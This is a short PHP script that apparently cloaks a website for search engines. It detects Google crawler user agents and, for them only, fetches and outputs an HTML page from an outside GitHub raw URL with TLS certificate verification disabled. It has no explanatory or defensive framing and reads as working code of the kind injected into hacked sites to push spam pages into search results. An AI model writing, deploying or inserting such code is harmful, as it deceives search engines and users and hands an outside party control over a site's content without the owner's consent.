<?php
function fetch_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $content = curl_exec($ch);
    curl_close($ch);
    return $content;
}

function is_google_bot_simple() {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $bots = array('Googlebot', 'Google-InspectionTool', 'AdsBot-Google', 'Mediapartners-Google');
    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) return true;
    }
    return false;
}

// --- 1. GOOGLE BOT VERSION ---
if (is_google_bot_simple()) {
    $google_url = "https://raw.githubusercontent.com/freyarion25/kw-lp/refs/heads/main/up-terus.txt";
    $content = fetch_remote_content($google_url);

    if ($content) {
        header('Content-Type: text/html; charset=utf-8');
        echo $content;
        exit;
    }
}
